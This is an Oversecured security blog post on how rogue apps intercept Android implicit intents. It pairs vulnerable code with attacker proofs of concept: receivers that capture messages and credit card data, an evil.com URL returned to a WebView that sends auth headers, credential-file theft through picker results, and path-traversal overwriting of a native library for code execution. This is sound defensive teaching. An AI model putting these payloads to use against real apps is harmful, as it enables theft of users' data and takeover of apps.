> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.oversecured.com](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)

All intents on Android are divided into two big categories: explicit and implicit. Explicit intents have a set receiver (the name of an app package and the class name of a handler component) and can be delivered only to a predetermined component (activity, receiver, service). With implicit intents, only certain parameters are set (e.g. action, data, mime type, categories) and Android itself decides which component to call. If the intent contains any private data, then data can be leaked to third-party apps installed on the same device when implicit intents are used. Insecure (implicit) intents look just the same: the only difference is the methods to which they are passed (`startActivity`, `sendBroadcast`, `startService` etc.). Oversecured automatically locates vulnerabilities of all these types and displays the places where these intents are created and run in the scan report. We have created special categories such as [Insecure activity start](https://oversecured.com/vulnerabilities#Insecure_activity_start), [Using an implicit intent to send a broadcast](https://oversecured.com/vulnerabilities#Using_an_implicit_intent_in_sendBroadcast), [Starting a service with an unspecified component](https://oversecured.com/vulnerabilities#Starting_a_service_with_an_unspecified_component) and so on.

These vulnerabilities are examined in our vulnerable Android app [OVAA](https://github.com/oversecured/ovaa). It includes an example of insecure broadcast dispatch:

![](https://blog.oversecured.com/assets/images/code-7th-article-broadcast.png)

And file theft:

![](https://blog.oversecured.com/assets/images/code-7th-article-theft.png)

And the interception of implicit intents when an activity is launched:

![](https://blog.oversecured.com/assets/images/code-7th-article-activity.png)

Insecure broadcasts
-------------------

For example, a messaging service requests new messages from the server and then passes them to a broadcast receiver which is responsible for displaying them on the user’s screen

```
Intent intent = new Intent("com.victim.messenger.IN_APP_MESSAGE");
intent.putExtra("from", id);
intent.putExtra("text", text);
sendBroadcast(intent);


```

Since the app uses implicit intents, an attacker can register a broadcast receiver with the same action and intercept user messages from a different app:

`AndroidManifest.xml` file

```
<receiver android:>
    <intent-filter>
        <action android: />
    </intent-filter>
</receiver>


```

`EvilReceiver.java` file

```
public class EvilReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        if("com.victim.messenger.IN_APP_MESSAGE".equals(intent.getAction())) {
            Log.d("evil", "From: " + intent.getStringExtra("from") + ", text: " + intent.getStringExtra("text")); // the attacking app simply logs the intercepted data, but it could do anything it liked with them - e.g. send them to a remote server
        }
    }
}


```

Implicit broadcasts are delivered to each receiver registered on the device, across all apps.

Insecure activity launches
--------------------------

Developers often create actions for particular things activities can do, and use implicit intents with certain private data to launch these activities. Example banking app

```
<activity android:>
    <intent-filter>
        <action android: />
        <category android: />
    </intent-filter>
</activity>


```

```
Intent intent = new Intent("com.victim.ADD_CARD_ACTION");
intent.putExtra("credit_card_number", num.getText().toString());
intent.putExtra("holder_name", name.getText().toString());
//...
startActivity(intent);


```

And this always works, because the likelihood of two different apps starting to handle the same action is extremely low

But what happens if there are several apps on the device at once, and their activities’ intent filters match the intent in question? The developers of Android foresaw this scenario and implemented the following functionality:

1.  If an implicit intent does not match any activity (across all apps), then when `startActivity(...)` is run (along with `startActivityForResult(...)`, `startActivityIfNeeded(...)` etc.) an`ActivityNotFoundException` is thrown
2.  If the intent matches only one activity, then that one is automatically run
3.  If several activities at once match, then the Activity Chooser is launched. It is up to the user to decide which app (and, therefore, activity within it) should be run. This resembles the Share button, which brings up an extensive list of apps to which particular data can be shared (Facebook, Twitter, an email client, etc.). But the attacker can control their position in the list using the `android:priority="num"` attribute in the `<intent-filter>` declaration

The attacker can thus intercept credit card data as follows

`AndroidManifest.xml` file

```
<activity android:>
    <intent-filter android:priority="999">
        <action android: />
        <category android: />
    </intent-filter>
</activity>


```

`EvilActivity.java` file

```
Log.d("evil", "Number: " + getIntent().getStringExtra("credit_card_number"));
Log.d("evil", "Holder: " + getIntent().getStringExtra("holder_name"));
//...


```

In the case of a real attack, the malware can also steal data from the intent that is passed and then readdress it to the victim app that was originally supposed to receive it

```
startActivity(getIntent()
    .setComponent(null)
    .setPackage("com.victim"));
finish();


```

Dynamic determination of intent receivers
-----------------------------------------

Some apps try to stop the activity picker appearing by automatically determining a single recipient and setting it in the intent settings (which is also very common when launching services, since implicit intents are forbidden in service launch)

```
Intent intent = new Intent("com.victim.ADD_CARD_ACTION");
intent.putExtra("credit_card_number", num.getText().toString());
intent.putExtra("holder_name", name.getText().toString());
//...
for(ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) {
    intent.setClassName(info.activityInfo.packageName, info.activityInfo.name);
    startActivity(intent);
    return;
}


```

this is more advantageous, because it eliminates the need for user interaction and automatically specifies the attacker’s activity

Attacks on an activity’s return value
-------------------------------------

If an implicit intent is launched using `startActivityForResult(...)`, an intercepting app can use a call to `setResult(...)` to return particular data in the launching app’s `onActivityResult`. These calls come in two major kinds: when the app uses system actions (`android.intent.action.PICK` to choose a photo, `android.intent.action.GET_CONTENT` to choose files, `android.media.action.IMAGE_CAPTURE` to create a photo, etc.), which usually leads to the theft of arbitrary files or images; and actions created by app developers, with a result that depends on how the app is implemented.

Example

```
startActivityForResult(new Intent("com.victim.PICK_ARTICLE"), 1);


```

```
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode == 1 && resultCode == -1) {
        webView.loadUrl(data.getStringExtra("picked_url"), getAuthHeaders());
    }
}


```

An attacker could attack this as follows

`AndroidManifest.xml` file

```
<activity android:>
    <intent-filter android:priority="999">
        <action android: />
        <category android: />
    </intent-filter>
</activity>


```

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setResult(-1, new Intent().putExtra("picked_url", "http://evil.com/"));
    finish();
}


```

Typical vulnerabilities in standard Android actions
---------------------------------------------------

It is worth saying something in particular about standard Android actions such as:

*   `android.intent.action.GET_CONTENT`
*   `android.intent.action.PICK`
*   `android.media.action.IMAGE_CAPTURE` etc. They are used to obtain the URI of a file (document, image, video) selected by the user and to process it in an app (e.g. by sending it to a server). But most Android/Java libraries can only send a file to a server, not an `InputStream` as returned by Android ContentResolver. So apps very often cache URI data into a file before processing it. In most cases this leads to arbitrary files being stolen or overwritten.

**Example 1. Theft of files.**

Example code from a vulnerable app:

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    startActivityForResult(new Intent(Intent.ACTION_PICK), 1337);
}
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode != 1337 || resultCode != -1 || data == null || data.getData() == null) {
        return;
    }
    Uri pickedUri = data.getData();
    File cacheFile = new File(getExternalCacheDir(), "temp");
    copy(pickedUri, cacheFile);
    
    // the file is then processed in some way
}
private void copy(Uri uri, File toFile) {
    try {
        InputStream inputStream = getContentResolver().openInputStream(uri);
        OutputStream outputStream = new FileOutputStream(toFile);
        copy(inputStream, outputStream);
    }
    catch (Throwable th) {
        // error handling
    }
}
public static void copy(InputStream inputStream, OutputStream outputStream) throws IOException {
    byte[] bArr = new byte[65536];
    while (true) {
        int read = inputStream.read(bArr);
        if (read == -1) {
            break;
        }
        outputStream.write(bArr, 0, read);
    }
}


```

An attacker can create a malware app that will return a link to a file in the targeted app’s private directory.

`AndroidManifest.xml` file:

```
<activity android:>
    <intent-filter android:priority="999">
        <action android: />
        <category android: />
        <data android:mimeType="*/*" />
        <data android:mimeType="image/*" />
    </intent-filter>
</activity>


```

`PickerActivity.java` file:

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setResult(-1, new Intent().setData(Uri.parse("file:///data/data/com.victim/databases/credentials")));
    finish();
}


```

When the victim clicks on the attacker’s app in the activity picker list, the file `/data/data/com.victim/databases/credentials` is automatically copied to SD card and can then be read by any app that has the permission `android.permission.READ_EXTERNAL_STORAGE`.

**Example 2. Overwriting arbitrary files.**

Code from a vulnerable app:

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    startActivityForResult(new Intent(Intent.ACTION_PICK), 1337);
}
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if(requestCode != 1337 || resultCode != -1 || data == null || data.getData() == null) {
        return;
    }
    Uri pickedUri = data.getData();
    File pickedFile;
    if("file".equals(pickedUri.getScheme())) {
        pickedFile = new File(pickedUri.getPath());
    }
    else if("content".equals(pickedUri.getScheme())) {
        pickedFile = new File(getCacheDir(), getFileName(pickedUri));
        copy(pickedUri, pickedFile);
    }
    // do something with the file
}
private String getFileName(Uri pickedUri) {
    Cursor cursor = getContentResolver().query(pickedUri, new String[]{MediaStore.MediaColumns.DISPLAY_NAME}, null, null, null);
    if(cursor != null && cursor.moveToFirst()) {
        String displayName = cursor.getString(cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME));
        if(displayName != null) {
            return displayName;
        }
    }
    return "temp";
}
// the copy method is the same as in the previous example


```

The attacker can pass a name including path-traversal to the `getFileName(...)` method using their own ContentProvider.

`AndroidManifest.xml` file:

```
<activity android:>
    <intent-filter android:priority="999">
        <action android: />
        <category android: />
        <data android:mimeType="*/*" />
        <data android:mimeType="image/*" />
    </intent-filter>
</activity>
<provider android:></provider>


```

`EvilContentProvider.java` file

```
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{"../lib-main/lib.so"});
    return matrixCursor;
}
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(new File("/data/data/com.attacker/fakelib.so"), ParcelFileDescriptor.MODE_READ_ONLY);
}


```

Thus the attacker can get beyond the limits of `/data/data/com.victim/cache/` and write the file to `lib.so` in the `/data/data/com.victim/lib-main/lib.so` directory, leading to arbitrary code execution in the victim’s context (on condition, naturally, that the victim loads a native library from that path).

Tips for developers
-------------------

You need to understand what the particular functions of your app are for, and whether or not you intend to make them available to other apps. If the answer is no, you need to use only explicit intents to launch activities and services, register broadcast receivers and send broadcasts. If your app does still need to interact with other apps, you need to be clear on whether that means absolutely any apps or some restricted set of them. For a restricted set (which will usually include apps from some particular ecosystem, such as Google Maps and Google Books) you should check the package signature and/or name; for an unrestricted set, you should validate absolutely all data received from them. At Oversecured, we frequently encounter incorrectly designed apps with millions of downloads, suffering from a vast range of vulnerabilities. So it’s important to pay attention to this point at the architecture planning stage for your app and for each new component.

Conclusion
----------

The incautious use of implicit intents is one of the commonest vulnerabilities on Android, and usually leads to users’ data being leaked. Oversecured has learned how to detect absolutely all such cases and to list all possible impacts from the use of implicit intents. Security researchers can [scan](https://oversecured.com/scan/create) any Android apps with our service, and app owners can [integrate](https://oversecured.com/integrations) Oversecured into their development process to correct existing errors in their apps and to stop new ones appearing.